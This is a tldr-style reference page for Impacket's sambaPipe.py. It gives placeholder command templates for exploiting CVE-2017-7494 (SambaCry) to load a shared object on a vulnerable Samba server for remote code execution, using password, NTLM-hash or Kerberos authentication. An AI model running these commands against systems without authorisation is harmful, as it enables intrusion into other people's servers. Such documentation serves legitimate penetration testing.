---
title: "Samba Exploit - RCE with SambaCry | Online Free DevTools by Hexmos"
name: sambapipe.py
path: "/freedevtools/tldr/common/sambapipe-py/"
canonical: "https://hexmos-com/freedevtools/tldr/common/sambapipe-py/"
description: "Exploit SambaCry vulnerabilities with sambaPipe.py. Achieve Remote Code Execution (RCE) on vulnerable Samba servers using shared object (SO) files. Free online tool, no registration required."
category: common
keywords:
- Samba exploit
- SambaCry exploit
- RCE exploit
- Remote Code Execution
- SMB vulnerability
- Shared object upload
- Linux exploit
- Network penetration testing
- CVE-2017-7494
- Impacket
features:
- Exploit SambaCry vulnerability for RCE
- Upload shared object files to vulnerable Samba servers
- Authenticate with NTLM hashes for exploitation
- Support Kerberos authentication for targeted exploitation
- Customize SMB connection port during exploitation
ogImage: "https://hexmos.com/freedevtools/site-banner.png"
twitterImage: "https://hexmos.com/freedevtools/site-banner.png"
---

# sambaPipe.py

> Exploit CVE-2017-7494 (SambaCry) to upload and load a shared object (SO) file on a vulnerable Samba server for remote code execution.
> More information: <https://github.com/fortra/impacket>.

- Upload and load a shared object file on a vulnerable Samba server:

`sambaPipe.py -so {{path/to/file.so}} {{domain}}/{{username}}:{{password}}@{{target}}`

- Authenticate using NTLM hashes instead of a password:

`sambaPipe.py -so {{path/to/file.so}} -hashes {{LM_HASH:NT_HASH}} {{domain}}/{{username}}:{{password}}@{{target}}`

- Use Kerberos authentication for the target:

`sambaPipe.py -so {{path/to/file.so}} -k -no-pass {{domain}}/{{username}}:{{password}}@{{target}}`

- Specify a domain controller IP for authentication:

`sambaPipe.py -so {{path/to/file.so}} -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}@{{target}}`

- Use a custom port for the SMB connection:

`sambaPipe.py -so {{path/to/file.so}} -port {{port}} {{domain}}/{{username}}:{{password}}@{{target}}`
